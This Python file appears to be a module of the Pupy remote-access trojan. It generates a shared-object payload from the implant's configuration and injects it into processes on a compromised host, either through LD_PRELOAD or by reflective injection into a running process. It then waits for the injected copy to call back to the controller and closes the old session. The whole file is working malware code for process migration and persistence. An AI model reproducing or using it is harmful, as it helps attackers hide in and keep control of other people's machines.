import pupygen
import time

def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([
            True for x in c.desc if x in [
                "hostname",
                "platform",
                "release",
                "version",
                "macaddr"
            ] and client.desc[x]==c.desc[x]
        ]):
            if int(c.desc["pid"])==pid:
                return c
    return None

def ld_preload(module, command, wait_thread=False, keep=False):
    rtempfile = module.client.conn.modules['tempfile']

    if module.client.is_proc_arch_64_bits():
        module.info('Generate pupyx64.so payload')
        dllbuf = pupygen.get_edit_pupyx64_so(module.client.get_conf())
    else:
        module.info('Generate pupyx64.so payload')
        dllbuf = pupygen.get_edit_pupyx86_so(module.client.get_conf())

    pid = module.client.conn.modules['pupy'].ld_preload_inject_dll(
        command, dllbuf, wait_thread
    )

    if pid == -1:
        module.error('Inject failed')
        return
    else:
        module.success('Process created: {}'.format(pid))

    if keep:
        return

    module.success("waiting for a connection from the DLL ...")
    while True:
        c=has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.desc["id"]=module.client.desc["id"]
            break
        time.sleep(0.1)
    try:
        module.client.conn.exit()
    except Exception:
        pass

def migrate(module, pid, keep=False):
    dllbuf=b''
    if module.client.is_proc_arch_64_bits():
        module.info('Generate pupyx64.so payload')
        dllbuf = pupygen.get_edit_pupyx64_so(module.client.get_conf())
    else:
        module.info('Generate pupyx64.so payload')
        dllbuf = pupygen.get_edit_pupyx86_so(module.client.get_conf())

    r = module.client.conn.modules['pupy'].reflective_inject_dll(
        pid, dllbuf, 0
    )

    if r:
        module.success("DLL injected !")
    else:
        module.error("Injection failed !")
        return

    if keep:
        return

    module.success("waiting for a connection from the DLL ...")
    while True:
        c=has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.desc["id"]=module.client.desc["id"]
            break
        time.sleep(0.1)
    try:
        module.client.conn.exit()
    except Exception:
        pass
